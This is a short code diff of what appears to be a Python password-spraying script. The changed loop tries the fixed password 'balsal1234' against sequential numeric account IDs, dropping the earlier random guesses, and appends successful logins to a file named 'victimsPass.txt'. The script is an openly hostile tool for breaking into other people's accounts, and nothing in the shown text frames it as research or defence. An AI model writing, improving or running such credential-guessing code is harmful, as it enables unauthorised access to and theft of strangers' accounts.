@@ -46,12 +46,12 @@ def init(user,pas):
 def tryhard():
 	char = '1234qwer'
 	m = 1
-	nr = 100024298102137
+	nr = 100027583752562
 	while True:
-		x = random.choices(char,k=8)
-		npn = ''.join(x)
-		var = init(nr,npn)
-		print(f'{[m]} {var} \033[36m\033[1m{npn} \033[33m\033[1m>>id: {nr}')
+	#	x = random.choices(char,k=8)
+	#	npn = ''.join(x)
+		var = init(nr,'balsal1234')
+		print(f'{[m]} {var} \033[36m\033[1mbalsal1234 \033[33m\033[1m>>id: {nr}')
 		m += 1;nr += 1
 		if 'Correct Password' in var:
 			file = open('victimsPass.txt','a')
